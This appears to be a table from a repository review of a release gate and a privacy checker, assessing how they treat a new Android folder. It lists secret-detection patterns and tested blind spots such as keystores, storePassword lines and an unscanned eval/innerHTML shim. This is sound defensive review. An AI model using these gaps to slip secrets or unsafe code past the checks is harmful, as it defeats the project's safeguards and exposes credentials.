| release-gate | Release gate (scripts/release-gate.sh) | bash; deno v2.9.8; python3; rg (ripgrep); unzip (zip mode); git (section 1b diff against origin/main) | The gate needs no change for a new top-level android/ folder. Put the Android checks in a new script or in new Deno tests. A change to the gate itself needs the owner's approval (CLAUDE.md, CONVENTIONS.md section 9). | Checked by a run: a scratch clone with android/ (Gradle wrapper 9.9.1, gradlew, gradlew.bat, build.gradle.kts, Kotlin, a JS shim with eval and innerHTML, a copy of threat-network.json, local.properties) gave VERDICT: CLEAN in repo mode (884 passed, 0 failed, 9 ignored, 5m5s) and in zip mode. The Python block of section 1b (SHA-256 and byte count against scripts/frozen-pins.json) is a good model for a Gradle verify task. | Checked: sections 2c (Curben rule), 3 (eval, innerHTML, document.write, identity, tracker names, URL hosts, secrets) and 4 (chrome.* scope) scan only manifest.json and src/. Thus android/ gets no protection from the gate: the simulated eval/innerHTML shim passed. If Android code goes into src/, sections 3 and 4 and test/final-chrome-utf8.test.js apply to it and can fail. A list of filter sources in Kotlin escapes the Curben rule (#13, #18b). |
| privacy-check | Privacy check (scripts/privacy-check.py) | python3 (standard library, run with -I); git; secret PRIVACY_PATTERNS (CI only) | The check scans each changed file at any path, so android/ is scanned with no change. Scope (checked): the diff, the full content of each changed file, each changed path (all tree paths on a push to main), commit messages and author data, printable runs of 6 or more characters in binary files, and metadata of changed images. Rejected (checked): personal-string rows from PRIVACY_PATTERNS; private-key blocks; GitHub, OpenAI/Anthropic sk-, AWS AKIA, Google AIza, Slack xox tokens; JSON web tokens; public IPv4/IPv6 outside the documentation ranges; e-mail addresses except noreply and example/test/invalid/local domains; home paths /home/<name>, /Users/<name>, C:/Users/<name>, /c/Users/<name>; EXIF/XMP/comment/text chunks in images. The marker 'privacy-check: allow' excuses only IP, e-mail and home-path hits on that line. | Checked by a run: the Gradle 9.9.1 wrapper jar (49,154 bytes, has NUL bytes, scanned as binary runs), gradlew, gradlew.bat and gradle-wrapper.properties gave no generic finding. The paths android/gradle/wrapper/* gave no finding. The personal-string rows are secret, so a chance hit in the jar is not checked. | Checked: (1) A committed copy of src/rules/*.json under android/ fails with 'IP address' (HOST_DATA_RE exempts only src/rules/<file>.json). The secret rows also match hostnames in src/rules/*.json (the control in test/privacy-generic.test.js needs this), so a copy also fails the personal-string check. (2) A public DNS IP literal in Kotlin (for example a resolver for a local VPN) fails. (3) The Windows form that Android Studio writes in local.properties (C\:\\Users\\<name>\\...) is NOT detected by the home-path check. (4) storePassword = "..." lines are NOT detected. (5) A keystore (.jks, .keystore) holds a private key in binary form and is NOT detected. (6) If a binary file (jar, png, webp) matches a secret row by chance, the fix is a blob id in BINARY_NOISE_BLOBS. On a pull request the job runs the checker from the base commit, so that fix must merge to main first in its own pull request. (7) An applicationId or package name with a personal handle fails. |

A paths filter on a required status check leaves the check pending forever: do not make android.yml required, or do not filter.
